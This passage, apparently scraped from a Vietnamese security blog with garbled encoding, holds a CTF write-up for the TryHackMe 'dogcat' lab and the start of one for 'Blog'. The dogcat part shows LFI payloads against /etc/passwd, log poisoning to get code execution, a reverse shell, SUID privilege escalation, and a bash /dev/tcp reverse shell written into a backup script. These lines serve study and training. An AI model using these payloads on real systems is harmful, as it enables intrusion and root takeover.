[22/Aug/2022:08:19:59 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:20:30 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:21:01 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:21:31 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:22:01 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:22:32 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:23:02 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:23:32 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:24:02 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:24:33 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:25:03 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:25:33 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:26:04 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:26:34 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:27:04 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:27:34 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:28:05 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:28:35 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:29:05 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 10.18.3.74 - - [22/Aug/2022:08:29:20 +0000] \u0026#34;GET /?view=dog HTTP/1.1\u0026#34; 200 564 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\u0026#34; 10.18.3.74 - - [22/Aug/2022:08:29:20 +0000] \u0026#34;GET /style.css HTTP/1.1\u0026#34; 200 698 \u0026#34;http://10.10.36.162/?view=dog\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\u0026#34; 10.18.3.74 - - [22/Aug/2022:08:29:20 +0000] \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34; 404 490 \u0026#34;http://10.10.36.162/?view=dog\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\u0026#34; 10.18.3.74 - - [22/Aug/2022:08:29:21 +0000] \u0026#34;GET /dogs/10.jpg HTTP/1.1\u0026#34; 200 50062 \u0026#34;http://10.10.36.162/?view=dog\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\u0026#34; 10.18.3.74 - - [22/Aug/2022:08:29:31 +0000] \u0026#34;GET /?view=dog HTTP/1.1\u0026#34; 200 527 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\u0026#34; 10.18.3.74 - - [22/Aug/2022:08:29:32 +0000] \u0026#34;GET /dogs/10.jpg HTTP/1.1\u0026#34; 304 145 \u0026#34;http://10.10.36.162/?view=dog\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:29:35 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:30:06 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 10.18.3.74 - - [22/Aug/2022:08:30:34 +0000] \u0026#34;GET /?view=php://filter/convert.base64-encode/dog/resource=../../../../../../../var/log/apache2/access.log\u0026amp;ext HTTP/1.1\u0026#34; 200 1449 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:30:36 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:31:06 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:31:37 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:32:07 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:32:37 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:33:07 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:33:38 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 10.18.3.74 - - [22/Aug/2022:08:33:39 +0000] \u0026#34;GET /?view=php://filter/convert.base64-encode/dog/resource=../../../../../../../etc/passwd\u0026amp;ext\u0026amp;cmd=whoami HTTP/1.1\u0026#34; 200 1176 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:34:08 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:34:38 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:35:08 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:35:39 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:36:09 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:36:39 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:37:09 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 10.18.3.74 - - [22/Aug/2022:08:37:35 +0000] \u0026#34;GET /?view=php://filter/convert.base64-encode/dog/resource=../../../../../../../etc/passwd\u0026amp;cmd=whoami\u0026amp;ext HTTP/1.1\u0026#34; 200 1176 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:37:40 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:38:10 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 10.18.3.74 - - [22/Aug/2022:08:38:38 +0000] \u0026#34;GET /?view=php://filter/convert.base64-encode/dog/resource=../../../../../../../etc/passwd\u0026amp;cmd=whoami\u0026amp;ext HTTP/1.1\u0026#34; 200 1176 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:38:40 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 10.18.3.74 - - [22/Aug/2022:08:39:00 +0000] \u0026#34;GET /?view=php://filter/convert.base64-encode/dog/resource=../../../../../../../var/log/apache2/access.log\u0026amp;ext\u0026amp;cmd=whoami HTTP/1.1\u0026#34; 200 1884 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:39:10 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:39:41 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:40:11 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:40:41 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:41:12 +0000] \u0026#34;GET / HTTP/1 Äiá»u nÃ y cÃ³ nghÄ©a lÃ  tÃ´i cÃ³ thá»ƒ thá»±c thi lá»‡nh nÃ o Ä‘Ã³ vÃ  nÃ³ Ä‘á»u sáº½ lÆ°u á»Ÿ Ä‘Ã¢y. Tiáº¿p tá»¥c thá»­ tÃ¬m kiáº¿m vÃ  cuá»‘i cÃ¹ng tÃ´i cÅ©ng tÃ¬m Ä‘Æ°á»£c cÃ¡ch upload RCE. Báº±ng cÃ¡ch thay Ä‘á»•i User-Agent báº±ng má»™t Ä‘oáº¡n code PHP, tÃ´i cÃ³ thá»ƒ táº£i lÃªn server tá»‡p RCE cá»§a mÃ¬nh.\nÄá»c thÃªm: From LFI to RCE!!\nÄáº§u tiÃªn táº¡o local http server.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... ThÃªm Ä‘oáº¡n code PHP Ä‘áº©y file reverse shell PHP lÃªn server. TÃ´i thÆ°á»ng dÃ¹ng shell cá»§a pentestmonkey\nSau Ä‘Ã³ táº¡o listener vá»›i port Ä‘Ã£ cáº¥u hÃ¬nh bÃªn trong file shell. Cuá»‘i cÃ¹ng lÃ  truy cáº­p file shell vá»«a táº£i lÃªn http://10.10.36.162/shell.php\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.36.162] 46762 Linux cea413fd4ac1 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux 09:08:03 up 1:02, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ pwd /var/www/html $ ls cat.php cats dog.php dogs flag.php index.php shell.php style.css Trong flag.php tÃ´i cÃ³ flag 1\ncd .. ls flag2_QMW7JvaY2LvK.txt html BÃªn trong /var/www/ tÃ´i tÃ¬m Ä‘Æ°á»£c flag thá»© 2\nPrivilege escalation # Táº¥t nhiÃªn lÃ  vá»›i user www-data tÃ´i khÃ´ng thá»ƒ xem quyá»n thá»±c thi vá»›i root báº±ng sudo -l. Thá»­ tÃ¬m file vá»›i SUID\n$ find / -type f -perm -u=s 2\u0026gt;/dev/null /bin/mount /bin/su /bin/umount /usr/bin/chfn /usr/bin/newgrp /usr/bin/passwd /usr/bin/chsh /usr/bin/env /usr/bin/gpasswd /usr/bin/sudo ÄÃ¢y Ä‘á»u lÃ  nhá»¯ng chÆ°Æ¡ng trÃ¬nh há»‡ thá»‘ng, trá»« env, vÃ o GTFOBins vÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c cÃ¡ch leo thang Ä‘áº·c quyá»n vá»›i SUID\n$ /usr/bin/env /bin/sh -p id uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data) cd /root/ ls flag3.txt Tiáº¿p theo, khi list cÃ¡c thÆ° má»¥c tÃ´i Ä‘á»ƒ Ã½ tháº¥y cÃ³ .dockerenv\n$ ls -la total 80 drwxr-xr-x 1 root root 4096 Aug 22 08:07 . drwxr-xr-x 1 root root 4096 Aug 22 08:07 .. -rwxr-xr-x 1 root root 0 Aug 22 08:07 .dockerenv drwxr-xr-x 1 root root 4096 Feb 26 2020 bin drwxr-xr-x 2 root root 4096 Feb 1 2020 boot drwxr-xr-x 5 root root 340 Aug 22 08:08 dev drwxr-xr-x 1 root root 4096 Aug 22 08:07 etc drwxr-xr-x 2 root root 4096 Feb 1 2020 home drwxr-xr-x 1 root root 4096 Feb 26 2020 lib drwxr-xr-x 2 root root 4096 Feb 24 2020 lib64 drwxr-xr-x 2 root root 4096 Feb 24 2020 media drwxr-xr-x 2 root root 4096 Feb 24 2020 mnt drwxr-xr-x 1 root root 4096 Aug 22 08:08 opt dr-xr-xr-x 106 root root 0 Aug 22 08:08 proc drwx------ 1 root root 4096 Mar 10 2020 root drwxr-xr-x 1 root root 4096 Aug 22 09:48 run drwxr-xr-x 1 root root 4096 Feb 26 2020 sbin drwxr-xr-x 2 root root 4096 Feb 24 2020 srv dr-xr-xr-x 13 root root 0 Aug 22 09:41 sys drwxrwxrwt 1 root root 4096 Mar 10 2020 tmp drwxr-xr-x 1 root root 4096 Feb 24 2020 usr drwxr-xr-x 1 root root 4096 Feb 26 2020 var Äiá»u nÃ y cÃ³ nghÄ©a lÃ  tÃ´i Ä‘ang á»Ÿ trong 1 container. Sau 1 lÃºc tÃ¬m kiáº¿m thÃ¬ tÃ´i tÃ¬m tháº¥y backup.sh bÃªn trong thÆ° má»¥c /opt.\n$ cat backup.sh #!/bin/bash tar cf /root/container/backup/backup.tar /root/container TÃ´i sáº½ thÃªm payload vÃ o file nÃ y báº±ng echo vÃ  sau Ä‘Ã³ táº¡o listener vá»›i port 9001\necho \u0026#34;#!/bin/bash\u0026#34; \u0026gt; backup.sh echo \u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.18.3.74/9001 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; backup.sh â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.36.162] 35894 bash: cannot set terminal process group (7995): Inappropriate ioctl for device bash: no job control in this shell root@dogcat:~# root@dogcat:~# ls ls container flag4.txt root@dogcat:~# ","date":"25 December 2021","externalUrl":null,"permalink":"/ctf/tryhackme/dogcat/","section":"Ctf","summary":"","title":"Tryhackme - dogcat","type":"ctf"},{"content":"","date":"18 December 2021","externalUrl":null,"permalink":"/tags/linux-environment/","section":"Tags","summary":"","title":"Linux Environment","type":"tags"},{"content":"Láº§n trÆ°á»›c tÃ´i cÃ³ lÃ m CTF cÃ³ liÃªn quan Ä‘áº¿n Wordpress. Wordpress lÃ  má»™t trong nhá»¯ng CMS phá»• biáº¿n vÃ  máº¡nh máº½ nháº¥t hiá»‡n táº¡i. ChÃ­nh vÃ¬ má»©c Ä‘á»™ phá»• biáº¿n vÃ  tiá»‡n dá»¥ng cá»§a nÃ³ mÃ  ráº¥t nhiá»u ngÆ°á»i Ä‘Ã£ tÃ¬m cÃ¡ch khai thÃ¡c nÃ³ vá»›i cÃ¡c má»¥c Ä‘Ã­ch tá»‘t - xáº¥u khÃ¡c nhau, Ä‘áº¿n má»©c cÃ³ cáº£ 1 cÃ´ng cá»¥ máº¡nh máº½ dÃ nh riÃªng Ä‘á»ƒ khai thÃ¡c Wordpress Ä‘Ã³ lÃ  WPScan\nHÃ´m nay, Ä‘á»ƒ tiáº¿p ná»‘i vá» wpscan tÃ´i sáº½ lÃ m CTF cÃ³ Wordpress lÃ  Tryhackme - Blog\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ cá»§a target machine.\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy+6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P+AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq+Yuc1JbkF8dxMF51tiQF35g0Nqo+UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3+tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP | 256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI= | 256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df8 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E |_http-server-header: Apache/2.4.29 (Ubuntu) | http-robots.txt: 1 disallowed entry |_/wp-admin/ |_http-generator: WordPress 5.0 |_http-title: Billy Joel\u0026amp;#039;s IT Blog \u0026amp;#8211; The IT blog 139/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: blog | NetBIOS computer name: BLOG\\x00 | Domain name: \\x00 | FQDN: blog |_ System time: 2022-08-15T08:49:47+00:00 |_clock-skew: mean: -13s, deviation: 1s, median: -14s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2022-08-15T08:49:47 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 24258/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 26279/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 64265/udp): CLEAN (Failed to receive data) | Check 4 (port 41481/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | nbstat: NetBIOS name: BLOG, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | Names: | BLOG\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | BLOG\u0026lt;03\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | BLOG\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 á» Ä‘Ã¢y tÃ´i cÃ³ 3 port Ä‘Ã¡ng quan tÃ¢m:\nPort 80 vá»›i web Ä‘Æ°á»£c build báº±ng Wordpress vá»›i phiÃªn báº£n 5.0, trong robots.txt cÃ³ path /wp-admin/. Äá»ƒ truy cáº­p vÃ o trang nÃ y tÃ´i cÅ©ng sáº½ pháº£i thÃªm IP vÃ o file host Port 139 vÃ  445 lÃ  smb cá»§a window 6.1 TÃ´i sáº½ thá»­ khai thÃ¡c 2 port window trÆ°á»›c xem cÃ³ gÃ¬ há»¯u Ã­ch khÃ´ng.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ smbmap -H 10.10.112.165 [+] Guest session IP: 10.10.112.165:445 Name: blog.thm Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers BillySMB READ, WRITE Billy\u0026#39;s local SMB Share IPC$ NO ACCESS IPC Service (blog server (Samba, Ubuntu)) Thá»­ vÃ o share file BillySMB\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ smbclient \\\\\\\\10.10.112.165\\\\BillySMB Password for [WORKGROUP\\neo]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Mon Aug 15 05:01:00 2022 .. D 0 Tue May 26 13:58:23 2020 Alice-White-Rabbit.jpg N 33378 Tue May 26 14:17:01 2020 tswift.mp4 N 1236733 Tue May 26 14:13:45 2020 check-this. N 3082 Tue May 26 14:13:43 2020 15413192 blocks of size 1024. 9790372 blocks available Láº¥y cÃ¡c file nÃ y vá» Ä‘á»ƒ phÃ¢n tÃ­ch. TÃ´i cÃ³ 2 file áº£nh vÃ  1 trong sá»‘ Ä‘Ã³ lÃ  QRCode dáº«n Ä‘áº¿n 1 MV ca nháº¡c mÃ  tÃ´i chÆ°a nghe bao giá»: Billy Joel - We Didnâ€™t Start the Fire (Official Video)\nTÃ´i thá»­ binwalk vá»›i file áº£nh cÃ²n láº¡i nhÆ°ng khÃ´ng káº¿t quáº£. Tuy nhiÃªn khi thá»­ vá»›i steghide vÃ  khÃ´ng cÃ³ passphrase thÃ¬ tÃ´i Ä‘Æ°á»£c 1 file txt má»›i.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ steghide extract -sf Alice-White-Rabbit.jpg Enter passphrase: wrote extracted data to \u0026#34;rabbit_hole.txt\u0026#34;. â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat rabbit_hole.txt You\u0026#39;ve found yourself in a rabbit hole, friend. Tháº­t biáº¿t cÃ¡ch Ä‘Ã¹a \u0026#x1f603; Chiáº¿c video cÃ²n láº¡i cÅ©ng khÃ´ng cÃ³ gá»£i Ã½ hay má»™t chá»‰ dáº«n nÃ o. Váº­y nÃªn tÃ´i sáº½ quay láº¡i web vá»›i port 80.\nSau khi thÃªm IP vÃ o host thÃ¬ tÃ´i cÃ³ 1 blog vá» IT sá»Ÿ há»¯u bá»Ÿi Billy Joel\nXem qua 1 lÃºc thÃ¬ blog chá»‰ cÃ³ 2 bÃ i viáº¿t vÃ  tÃ´i cÃ³ 2 cÃ¡i tÃªn lÃ  Billy vÃ  máº¹ cá»§a anh ta - Karen Wheeler. Thá»­ dÃ¹ng WPScan Ä‘á»ƒ quÃ©t trang nÃ y\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ wpscan --url blog.thm -e u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://blog.thm/ [10.10.112.165] [+] Started: Mon Aug 15 05:38:05 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://blog.thm/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://blog.thm/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Rss Generator (Passive Detection) | - http://blog.thm/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.0\u0026lt;/generator\u0026gt; | - http://blog.thm/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.0\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://blog.thm/wp-content/themes/twentytwenty/ | Last Updated: 2022-05-24T00:00:00.000Z | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 2.0 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme 